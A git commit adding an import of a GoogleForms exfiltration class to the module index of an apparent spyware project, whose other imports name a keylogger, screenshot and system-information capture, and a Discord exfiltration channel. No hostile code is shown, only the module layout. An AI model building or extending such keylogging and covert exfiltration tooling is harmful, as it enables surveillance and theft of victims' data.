66889d4fafb2b47870da45225a0932055e579318
EONRaider <livewire_voodoo@protonmail.com>
2021-11-21 11:40:30 -0300

    Add import for GoogleForms class

--- src/modules/__init__.py
+++ src/modules/__init__.py
@@ -2,6 +2,7 @@ from src.modules.exfiltration.exfiltration_module import ExfiltrationModule
 from src.modules.exploitation.exploitation_module import ExploitationModule
 
 from src.modules.exfiltration.discord_server import Discord
+from src.modules.exfiltration.google_forms import GoogleForms
 from src.modules.exploitation.keylogger import KeyLogger
 from src.modules.exploitation.system_information import SystemInformation
 from src.modules.exploitation.screenshot import ScreenShot
